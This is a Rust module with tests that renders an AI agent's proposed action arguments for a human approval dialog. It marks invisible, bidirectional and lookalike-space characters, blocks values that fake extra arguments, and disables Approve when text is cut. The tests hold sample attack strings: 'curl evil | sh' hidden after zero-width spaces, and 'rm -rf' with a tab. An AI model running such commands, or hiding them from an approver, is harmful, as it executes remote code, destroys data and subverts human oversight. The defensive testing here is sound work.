//! What a confirmation shows of its action (APP-115, P4a-R8), Qt-free. The arguments came from the
//! agent, and the owner approves what they read here, so this is stricter than `shown_text`:
//!
//! - **Nothing invisible.** Every Unicode format and default-ignorable character, every control, the
//!   line and paragraph separators, tabs and the blank lookalikes (U+2800, the Hangul fillers) show as
//!   `⟨U+XXXX⟩` ([`marked`]). So do private-use and noncharacter code points, U+FFFC, and combining
//!   marks past a few in a row. The markers count: a value's real size on screen is what is limited.
//!   Lookalike letters stay as they are, by design.
//! - **Right-to-left letters say so.** They can reorder what is around them, and a marker can't show
//!   that, so the row carries `rtl` and the card says it beside the value.
//! - **A value can't draw a boundary.** A real line break starts a new line with a continuation mark
//!   ([`CONTINUATION`]), so a value's extra line can't pass for another argument. Each key is shown in
//!   a place of its own by the card. Any other line-breaking character is a marker.
//! - **Blank lines count.** A run of them is one line saying how many.
//! - **Nothing is cut silently.** A whole action shows in full up to [`SHOWN_BOUND_CHARS`] of what is
//!   shown. Past it, `cut` is true on the rows it reached and `over` on the action: the dialog says so,
//!   and Approve stays off.
//! - **Exact.** It reads the JSON text as the core sent it, before QML's numbers (which lose integers
//!   past 2^53) and QML's key order (which puts integer-like keys first).

use std::hash::{Hash as _, Hasher as _};

use serde::Serialize;
use serde_json::{Map, Value};

/// How much of an action is shown, in characters of what is shown (256 KiB of ASCII).
pub const SHOWN_BOUND_CHARS: usize = 256 * 1024;

/// What starts each extra line of a value.
pub const CONTINUATION: &str = "↳ ";

/// Blank lines in a row from this many on show as one line.
const BLANK_RUN: usize = 2;

/// How many combining marks in a row show as themselves. Pointed Hebrew reaches four.
const COMBINING_RUN: usize = 4;

/// The most arguments shown, each a row to lay out. More is past the bound.
pub const SHOWN_ROWS_MAX: usize = 1000;

/// Whether `c` shows as a marker: a reader couldn't see it, or it would move the text around.
pub fn is_marked(c: char) -> bool {
    c.is_control()
        || lil_parse::is_invisible(c)
        // Noncharacters: the last two of every plane, and these.
        || u32::from(c) & 0xfffe == 0xfffe
        || matches!(
            c,
            '\u{fdd0}'..='\u{fdef}'
            // Private use: what it draws depends on the font.
            | '\u{e000}'..='\u{f8ff}' | '\u{f0000}'..='\u{ffffd}' | '\u{100000}'..='\u{10fffd}'
            // The object replacement character, and a blank that takes up room.
            | '\u{fffc}' | '\u{16fe4}'
        )
        || matches!(
            c,
            // The bidirectional controls, which is_invisible leaves to shown_text.
            '\u{200e}' | '\u{200f}' | '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}'
            // Line and paragraph separators (Zl, Zp).
            | '\u{2028}' | '\u{2029}'
            // The rest of the format characters (Cf) that aren't default-ignorable.
            | '\u{600}'..='\u{605}' | '\u{6dd}' | '\u{70f}' | '\u{890}'..='\u{891}' | '\u{8e2}'
            | '\u{fff9}'..='\u{fffb}' | '\u{110bd}' | '\u{110cd}' | '\u{13430}'..='\u{1343f}'
            // A blank that isn't a space, like the Hangul fillers (default-ignorable, above).
            | '\u{2800}'
            // Spaces that aren't the plain one: a path can differ by one and read the same.
            | '\u{a0}' | '\u{1680}' | '\u{2000}'..='\u{200a}' | '\u{202f}' | '\u{205f}' | '\u{3000}'
        )
}

/// `s` on one line, with everything [`is_marked`] says as `⟨U+XXXX⟩`, and any combining marks past
/// [`COMBINING_RUN`] in a row.
pub fn marked(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut run = 0;
    for c in s.chars() {
        run = if is_combining(c) { run + 1 } else { 0 };
        if is_marked(c) || run > COMBINING_RUN {
            out.push_str(&format!("\u{27e8}U+{:04X}\u{27e9}", u32::from(c)));
        } else {
            out.push(c);
        }
    }
    out
}

/// The marks that stack over and under a letter, so that a long run draws over other lines. Real
/// writing keeps to a few.
fn is_combining(c: char) -> bool {
    matches!(
        c,
        '\u{300}'..='\u{36f}' | '\u{483}'..='\u{489}'
        | '\u{591}'..='\u{5bd}' | '\u{5bf}' | '\u{5c1}'..='\u{5c2}' | '\u{5c4}'..='\u{5c5}' | '\u{5c7}'
        | '\u{610}'..='\u{61a}' | '\u{64b}'..='\u{65f}' | '\u{670}'
        | '\u{6d6}'..='\u{6dc}' | '\u{6df}'..='\u{6e4}' | '\u{6e7}'..='\u{6e8}' | '\u{6ea}'..='\u{6ed}'
        | '\u{e31}' | '\u{e34}'..='\u{e3a}' | '\u{e47}'..='\u{e4e}'
        | '\u{1ab0}'..='\u{1aff}' | '\u{1dc0}'..='\u{1dff}' | '\u{20d0}'..='\u{20ff}'
        | '\u{2de0}'..='\u{2dff}' | '\u{a66f}'..='\u{a672}' | '\u{a674}'..='\u{a67d}'
        | '\u{fe20}'..='\u{fe2f}'
        | '\u{1d165}'..='\u{1d169}' | '\u{1d16d}'..='\u{1d172}' | '\u{1d17b}'..='\u{1d182}'
        | '\u{1d185}'..='\u{1d18b}' | '\u{1d1aa}'..='\u{1d1ad}'
    )
}

/// Whether what is shown holds a right-to-left letter. By the bidirectional rules such a letter can
/// reorder the numbers and words around it, and no marker can show that: the card says so instead.
fn has_right_to_left(shown: &str) -> bool {
    shown.chars().any(|c| {
        matches!(
            c,
            '\u{590}'..='\u{8ff}' | '\u{fb1d}'..='\u{fdff}' | '\u{fe70}'..='\u{fefe}'
            | '\u{10800}'..='\u{10fff}' | '\u{1e800}'..='\u{1efff}'
        )
    })
}

/// A short name from outside (a tool, a caller, a project): [`marked`], then `shown_text`'s limit.
pub fn shown_line(s: &str, max_chars: usize) -> String {
    lil_parse::shown_text(&marked(s), max_chars)
}

/// One argument as shown.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct ShownArgument {
    /// Empty when the arguments aren't an object.
    pub key: String,
    pub text: String,
    /// Part of it isn't shown.
    pub cut: bool,
    /// It holds right-to-left letters, so it can draw in another order than it reads.
    pub rtl: bool,
}

/// A whole action as shown.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct ShownAction {
    pub rows: Vec<ShownArgument>,
    /// It is past [`SHOWN_BOUND_CHARS`], or couldn't be read: Approve stays off.
    pub over: bool,
    /// Changes with what is shown: a dialog re-arms when this does.
    pub digest: String,
}

/// Adds to `out` until `left` runs out; whether all of `text` went in.
fn take(out: &mut String, left: &mut usize, text: &str) -> bool {
    for c in text.chars() {
        if *left == 0 {
            return false;
        }
        out.push(c);
        *left -= 1;
    }
    true
}

fn value_text(value: &Value) -> String {
    match value {
        Value::String(s) => s.clone(),
        // Not through anything that rounds: this is the core's own number, pretty-printed.
        other => serde_json::to_string_pretty(other).unwrap_or_else(|_| other.to_string()),
    }
}

fn is_blank(line: &str) -> bool {
    line.chars().all(|c| c.is_whitespace() && !is_marked(c))
}

/// A value as it is shown, within `left` characters, which it uses up; and whether all of it went in.
fn shown_value(raw: &str, left: &mut usize) -> (String, bool) {
    let mut out = String::new();
    let mut first = true;
    let mut lines = split_lines(raw).peekable();
    while let Some(line) = lines.next() {
        let mut piece = String::new();
        if !first {
            piece.push('\n');
            piece.push_str(CONTINUATION);
        }
        if is_blank(line) {
            let mut run = 1;
            while lines.peek().is_some_and(|next| is_blank(next)) {
                lines.next();
                run += 1;
            }
            if run >= BLANK_RUN {
                piece.push_str(&format!("\u{27e8}{run} empty lines\u{27e9}"));
            } else {
                piece.push_str(line);
            }
        } else {
            piece.push_str(&marked(line));
        }
        if !take(&mut out, left, &piece) {
            return (out, false);
        }
        first = false;
    }
    (out, true)
}

/// Splits at real line breaks only (`\r\n`, `\n`, `\r`). Other separators stay, to show as markers.
fn split_lines(raw: &str) -> impl Iterator<Item = &str> {
    let mut rest = Some(raw);
    std::iter::from_fn(move || {
        let text = rest?;
        match text.find(['\r', '\n']) {
            None => {
                rest = None;
                Some(text)
            }
            Some(at) => {
                let skip = if text[at..].starts_with("\r\n") { 2 } else { 1 };
                rest = Some(&text[at + skip..]);
                Some(&text[..at])
            }
        }
    })
}

/// The whole action, up to `bound` characters of what is shown.
pub fn shown_action_within(arguments: &Value, bound: usize) -> ShownAction {
    let mut left = bound;
    let mut over = false;
    let mut rows = Vec::new();
    let mut one = |key: String, value: &Value, left: &mut usize| {
        let mut shown_key = String::new();
        let key_whole = take(&mut shown_key, left, &key);
        let (text, whole) = shown_value(&value_text(value), left);
        let whole = whole && key_whole;
        over |= !whole;
        rows.push(ShownArgument {
            rtl: has_right_to_left(&shown_key) || has_right_to_left(&text),
            key: shown_key,
            text,
            cut: !whole,
        });
    };
    match arguments {
        Value::Null => {}
        Value::Object(map) => {
            for (key, value) in map.iter().take(SHOWN_ROWS_MAX) {
                one(marked(key), value, &mut left);
            }
        }
        other => one(String::new(), other, &mut left),
    }
    let too_many_rows = arguments
        .as_object()
        .is_some_and(|map| map.len() > SHOWN_ROWS_MAX);
    if too_many_rows && let Some(last) = rows.last_mut() {
        last.cut = true;
    }
    let over = over || too_many_rows;
    let mut hasher = std::collections::hash_map::DefaultHasher::new();
    for row in &rows {
        row.key.hash(&mut hasher);
        row.text.hash(&mut hasher);
    }
    ShownAction {
        rows,
        over,
        digest: format!("{:016x}", hasher.finish()),
    }
}

/// The whole action, up to [`SHOWN_BOUND_CHARS`].
pub fn shown_action(arguments: &Value) -> ShownAction {
    shown_action_within(arguments, SHOWN_BOUND_CHARS)
}

/// Why a typed amount can't be the new limit of a cap now at `limit` (the core's decimal string), by
/// name, or `None` when it can. The Raise button shows the amount through `money_text`, which rounds
/// to the currency's minor unit, and what is sent must be what it says, so more decimals are refused.
/// A raise that isn't higher is refused too. Text, never a float.
pub fn raise_refusal(amount: &str, limit: &str, currency: &str) -> Option<&'static str> {
    let Some(new) = Decimal::parse(amount) else {
        return Some("not_a_number");
    };
    if new.fraction.len() > crate::money::minor_unit(currency) {
        return Some("too_many_decimals");
    }
    // A limit that can't be read refuses nothing here: the core has the say.
    Decimal::parse(limit)
        .is_some_and(|now| new.compare(&now) != std::cmp::Ordering::Greater)
        .then_some("not_higher")
}

/// A non-negative decimal's digits, with no leading or trailing zeros to compare.
struct Decimal<'a> {
    whole: &'a str,
    fraction: &'a str,
}

impl<'a> Decimal<'a> {
    /// Digits, at most 18 before the point, and any after it.
    fn parse(text: &'a str) -> Option<Decimal<'a>> {
        let (whole, fraction) = text.split_once('.').unwrap_or((text, ""));
        let digits = |s: &str| s.bytes().all(|b| b.is_ascii_digit());
        let dangling_point = text.contains('.') && fraction.is_empty();
        if whole.is_empty()
            || whole.len() > 18
            || !digits(whole)
            || !digits(fraction)
            || dangling_point
        {
            return None;
        }
        Some(Decimal {
            whole: whole.trim_start_matches('0'),
            fraction: fraction.trim_end_matches('0'),
        })
    }

    fn compare(&self, other: &Decimal<'_>) -> std::cmp::Ordering {
        self.whole
            .len()
            .cmp(&other.whole.len())
            .then_with(|| self.whole.cmp(other.whole))
            .then_with(|| self.fraction.cmp(other.fraction))
    }
}

/// From the JSON text of a `confirmations` event, an `app/confirmations.list` result or an
/// `app/confirmation.answer` result: `{<id>: ShownAction}`, as JSON. Text that isn't JSON gives `{}`:
/// the dialog then has nothing to show, and Approve stays off.
pub fn shown_actions_json(json: &str) -> String {
    let Ok(value) = serde_json::from_str::<Value>(json) else {
        return "{}".to_string();
    };
    let mut out = Map::new();
    let mut add = |row: &Value| {
        if let (Some(id), Some(arguments)) = (row["id"].as_str(), row.get("arguments"))
            && let Ok(shown) = serde_json::to_value(shown_action(arguments))
        {
            out.insert(id.to_string(), shown);
        }
    };
    if let Some(rows) = value["confirmations"].as_array() {
        rows.iter().for_each(&mut add);
    }
    if value.get("confirmation").is_some() {
        add(&value["confirmation"]);
    }
    Value::Object(out).to_string()
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn one(value: Value) -> ShownArgument {
        shown_action(&json!({ "a": value })).rows.remove(0)
    }

    /// `א 100 ב 900 ג` keeps its text, and by the bidi rules draws with the numbers swapped.
    #[test] // spec: APP-115, P4a-R8
    fn right_to_left_letters_say_so_beside_the_value() {
        for rtl in [
            "א 100 ב 900 ג",
            "pay 100 to \u{5d0}",
            "\u{627}\u{644}\u{639}\u{631}\u{628}\u{64a}\u{629}",
            "\u{fb50}",
            "\u{10800}",
            "\u{1e900}",
        ] {
            let row = one(json!(rtl));
            assert!(row.rtl, "{rtl}");
            assert_eq!(row.text, rtl, "the text stays as it is");
        }
        for not in [
            "C:\\art\\crane.png",
            "caf\u{e9} 100",
            "\u{442}\u{435}\u{441}\u{442}",
            "\u{65e5}\u{672c}\u{8a9e}",
            // Only a marker of it is left.
            "\u{200f}",
        ] {
            assert!(!one(json!(not)).rtl, "{not}");
        }
        let keyed = shown_action(&json!({"\u{5d0}": "x"}));
        assert!(keyed.rows[0].rtl, "a key too");
    }

    #[test] // spec: APP-115, P4a-R8
    fn what_a_reader_cant_tell_shows_as_a_marker() {
        for (c, name) in [
            ('\u{fffc}', "U+FFFC"),
            ('\u{16fe4}', "U+16FE4"),
            ('\u{e000}', "U+E000"),
            ('\u{f8ff}', "U+F8FF"),
            ('\u{f0000}', "U+F0000"),
            ('\u{10fffd}', "U+10FFFD"),
            ('\u{fdd0}', "U+FDD0"),
            ('\u{fdef}', "U+FDEF"),
            ('\u{fffe}', "U+FFFE"),
            ('\u{ffff}', "U+FFFF"),
            ('\u{1fffe}', "U+1FFFE"),
            ('\u{10ffff}', "U+10FFFF"),
        ] {
            assert_eq!(
                marked(&format!("a{c}b")),
                format!("a\u{27e8}{name}\u{27e9}b")
            );
        }
        // Lookalikes stay, by design, and so does what only looks odd.
        for plain in ["\u{430}pple", "\u{fffd}", "\u{e9}", "e\u{301}"] {
            assert_eq!(marked(plain), plain);
        }
    }

    #[test] // spec: APP-115, P4a-R8
    fn a_long_stack_of_combining_marks_shows_as_markers() {
        // Real writing stacks a few: Vietnamese two, pointed Hebrew up to four.
        assert_eq!(marked("e\u{302}\u{301}"), "e\u{302}\u{301}");
        let four = "\u{5d0}\u{5b0}\u{5bc}\u{591}\u{592}";
        assert_eq!(marked(four), four);
        // Past that, what is drawn over the line above and below is a marker.
        assert_eq!(
            marked("a\u{336}\u{337}\u{338}\u{339}\u{33a}\u{33b}b"),
            "a\u{336}\u{337}\u{338}\u{339}\u{27e8}U+033A\u{27e9}\u{27e8}U+033B\u{27e9}b"
        );
        // Thai marks, and the run starts again after a letter.
        assert_eq!(
            marked("\u{e01}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}"),
            "\u{e01}\u{e49}\u{e49}\u{e49}\u{e49}\u{27e8}U+0E49\u{27e9}"
        );
        let two = "a\u{301}\u{301}\u{301}b\u{301}\u{301}\u{301}";
        assert_eq!(marked(two), two);
    }

    /// Each character class the security review named.
    #[test] // spec: P4a-R8, APP-115
    fn every_invisible_character_shows_as_a_marker() {
        for (c, class) in [
            ('\u{e0041}', "tag"),
            ('\u{e0001}', "language tag"),
            ('\u{2062}', "invisible times"),
            ('\u{ad}', "soft hyphen"),
            ('\u{3164}', "Hangul filler"),
            ('\u{115f}', "Hangul choseong filler"),
            ('\u{ffa0}', "halfwidth Hangul filler"),
            ('\u{61c}', "Arabic letter mark"),
            ('\u{34f}', "combining grapheme joiner"),
            ('\u{fe00}', "variation selector"),
            ('\u{2028}', "line separator"),
            ('\u{2029}', "paragraph separator"),
            ('\u{fff9}', "interlinear annotation"),
            ('\u{180e}', "Mongolian vowel separator"),
            ('\u{206a}', "deprecated format"),
            ('\u{1d173}', "musical format"),
            ('\u{2800}', "Braille blank"),
            ('\u{202e}', "bidi override"),
            ('\u{200b}', "zero width space"),
            ('\u{200d}', "zero width joiner"),
            ('\u{feff}', "byte order mark"),
            ('\u{600}', "Arabic number sign"),
            ('\u{13430}', "Egyptian format"),
            ('\t', "tab"),
            ('\u{b}', "vertical tab"),
            ('\u{c}', "form feed"),
            ('\u{85}', "next line"),
            ('\u{7}', "bell"),
            ('\u{1}', "control"),
            ('\u{7f}', "delete"),
        ] {
            let text = format!("x{c}y");
            let want = format!("x\u{27e8}U+{:04X}\u{27e9}y", u32::from(c));
            assert_eq!(marked(&text), want, "{class}");
            assert_eq!(one(json!(text)).text, want, "{class}");
            assert_eq!(shown_line(&text, 100), want, "{class}");
        }
        assert_eq!(marked("rm\t-rf"), "rm⟨U+0009⟩-rf");
        // What a reader can see stays as it is.
        for text in ["plain", "café", "日本語", "C:\\art\\a b.png"] {
            assert_eq!(marked(text), text);
        }
    }

    #[test] // spec: P4a-R8, APP-115
    fn spaces_that_arent_the_plain_one_show_as_markers() {
        for c in [
            '\u{a0}', '\u{1680}', '\u{2003}', '\u{2009}', '\u{202f}', '\u{205f}', '\u{3000}',
        ] {
            let want = format!("a\u{27e8}U+{:04X}\u{27e9}b", u32::from(c));
            assert_eq!(marked(&format!("a{c}b")), want);
        }
        assert_eq!(marked("a b"), "a b", "the plain space stays");
    }

    #[test] // spec: APP-115
    fn the_bound_counts_keys_and_rows() {
        let shown = shown_action(&json!({ "k".repeat(SHOWN_BOUND_CHARS + 1): "" }));
        assert!(shown.over && shown.rows[0].cut, "a huge key is past it");
        assert_eq!(shown.rows[0].key.chars().count(), SHOWN_BOUND_CHARS);
        let mut many = Map::new();
        for i in 0..=SHOWN_ROWS_MAX {
            many.insert(format!("k{i}"), Value::Null);
        }
        let shown = shown_action(&Value::Object(many));
        assert!(shown.over, "more rows than it shows");
        assert_eq!(shown.rows.len(), SHOWN_ROWS_MAX);
        assert!(shown.rows.last().unwrap().cut, "and the last one says so");
        let mut enough = Map::new();
        for i in 0..SHOWN_ROWS_MAX {
            enough.insert(format!("k{i}"), Value::Null);
        }
        assert!(!shown_action(&Value::Object(enough)).over);
    }

    #[test] // spec: APP-054
    fn a_raise_is_a_number_in_the_currencys_decimals_and_higher() {
        for (amount, limit, currency, want) in [
            ("12", "1", "USD", None),
            ("12.50", "1", "USD", None),
            ("12.500", "1", "USD", None),
            ("1.01", "1", "USD", None),
            ("25000000", "20", "USD", None),
            ("121", "120", "JPY", None),
            ("2", "not a number", "USD", None),
            ("lots", "1", "USD", Some("not_a_number")),
            ("", "1", "USD", Some("not_a_number")),
            ("1.", "1", "USD", Some("not_a_number")),
            (".5", "0", "USD", Some("not_a_number")),
            ("-5", "1", "USD", Some("not_a_number")),
            ("1e3", "1", "USD", Some("not_a_number")),
            ("1234567890123456789", "1", "USD", Some("not_a_number")),
            ("25.999", "1", "USD", Some("too_many_decimals")),
            ("0.001", "0", "USD", Some("too_many_decimals")),
            ("120.7", "1", "JPY", Some("too_many_decimals")),
            ("1", "1", "USD", Some("not_higher")),
            ("1.00", "1", "USD", Some("not_higher")),
            ("0.5", "1", "USD", Some("not_higher")),
            ("50", "100", "USD", Some("not_higher")),
            ("9", "10", "USD", Some("not_higher")),
            ("1.09", "1.1", "USD", Some("not_higher")),
        ] {
            assert_eq!(
                raise_refusal(amount, limit, currency),
                want,
                "{amount} over {limit}"
            );
        }
    }

    #[test] // spec: APP-115
    fn a_value_cant_draw_another_argument() {
        let shown = shown_action(&json!({"a": "x\npath: C:\\safe", "path": "C:\\evil"}));
        assert_eq!(shown.rows[0].key, "a");
        assert_eq!(shown.rows[0].text, "x\n↳ path: C:\\safe");
        assert_eq!(shown.rows[1].key, "path");
        for line_break in ["\r\n", "\r", "\n"] {
            let text = one(json!(format!("one{line_break}two"))).text;
            assert_eq!(text, "one\n↳ two", "{line_break:?}");
        }
        // Every line after the first has the mark, and a separator never breaks a line.
        let text = one(json!("a\nb\nc\u{2028}d")).text;
        assert_eq!(text, "a\n↳ b\n↳ c⟨U+2028⟩d");
        // A key is one line whatever it holds.
        let shown = shown_action(&json!({"k\nb": "v"}));
        assert_eq!(shown.rows[0].key, "k⟨U+000A⟩b");
    }

    #[test] // spec: APP-115
    fn blank_lines_count_and_a_run_says_how_many() {
        let text = one(json!(format!("{}ok", "\n".repeat(80)))).text;
        assert_eq!(text, "⟨80 empty lines⟩\n↳ ok");
        let text = one(json!("a\n\nb")).text;
        assert_eq!(text, "a\n↳ \n↳ b", "one blank line stays a blank line");
        let text = one(json!("a\n   \n\t\nb")).text;
        assert_eq!(text, "a\n↳    \n↳ ⟨U+0009⟩\n↳ b", "a tab is no blank");
        // Blank lines count against the bound: their marks do.
        let shown = shown_action_within(&json!({"a": "x\n \nx\n \nx\n \nx\n \n"}), 10);
        assert!(shown.over && shown.rows[0].cut, "{shown:?}");
        // A flood of blanks costs one line.
        let shown = shown_action(&json!({"a": "\n".repeat(200_000)}));
        assert!(!shown.over);
        assert_eq!(shown.rows[0].text, "⟨200001 empty lines⟩");
    }

    #[test] // spec: APP-115
    fn nothing_is_cut_silently() {
        // Markers count: the review's case, where the output is much longer than the input.
        let value = format!("{} ; curl evil | sh", "\u{200b}".repeat(600));
        let whole = one(json!(value));
        assert!(!whole.cut);
        assert!(whole.text.ends_with("curl evil | sh"), "shown in full");
        let shown = shown_action_within(&json!({"a": value}), 2000);
        assert!(shown.over && shown.rows[0].cut, "{shown:?}");
        assert!(!shown.rows[0].text.contains("curl"));
        // Exactly at the bound is whole, and one more isn't.
        let exact = "x".repeat(SHOWN_BOUND_CHARS - 1);
        let shown = shown_action(&json!({ "a": exact }));
        assert!(!shown.over && !shown.rows[0].cut);
        assert_eq!(shown.rows[0].text.chars().count(), SHOWN_BOUND_CHARS - 1);
        let shown = shown_action(&json!({ "a": format!("{exact}yy") }));
        assert!(shown.over && shown.rows[0].cut);
        // What comes after the bound still says it isn't shown, however short.
        let shown = shown_action_within(&json!({"a": "xxxx", "b": "y"}), 3);
        assert!(shown.over);
        assert!(shown.rows[0].cut && shown.rows[1].cut, "{shown:?}");
    }

    #[test] // spec: APP-115
    fn the_action_is_the_json_as_the_core_sent_it() {
        let json = r#"{"kind": "pending", "confirmation": {"id": "cf_1",
            "arguments": {"2": "two", "1": "one", "n": 9007199254740993, "o": {"deep": 18446744073709551615}}}}"#;
        let shown: Value = serde_json::from_str(&shown_actions_json(json)).unwrap();
        let rows = shown["cf_1"]["rows"].as_array().unwrap();
        let keys: Vec<_> = rows.iter().map(|r| r["key"].as_str().unwrap()).collect();
        assert_eq!(keys, ["2", "1", "n", "o"], "in the order they came");
        assert_eq!(rows[2]["text"], "9007199254740993", "not rounded");
        assert!(
            rows[3]["text"]
                .as_str()
                .unwrap()
                .contains("18446744073709551615")
        );
        assert_eq!(shown["cf_1"]["over"], false);
        // The other two shapes, and text that isn't JSON.
        let list = r#"{"confirmations": [{"id": "cf_a", "arguments": {}}, {"id": "cf_b", "arguments": null}]}"#;
        let shown: Value = serde_json::from_str(&shown_actions_json(list)).unwrap();
        assert!(shown["cf_a"]["rows"].is_array() && shown["cf_b"]["rows"].is_array());
        let answer = r#"{"confirmation": {"id": "cf_c", "arguments": [1, 2]}}"#;
        let shown: Value = serde_json::from_str(&shown_actions_json(answer)).unwrap();
        assert_eq!(shown["cf_c"]["rows"][0]["key"], "");
        assert_eq!(shown_actions_json("not json"), "{}");
    }

    #[test] // spec: APP-115
    fn the_digest_follows_what_is_shown() {
        let digest = |v: Value| shown_action(&v).digest;
        assert_eq!(digest(json!({"a": "x"})), digest(json!({"a": "x"})));
        assert_ne!(digest(json!({"a": "x"})), digest(json!({"a": "y"})));
        assert_ne!(digest(json!({"a": "x"})), digest(json!({"b": "x"})));
    }
}
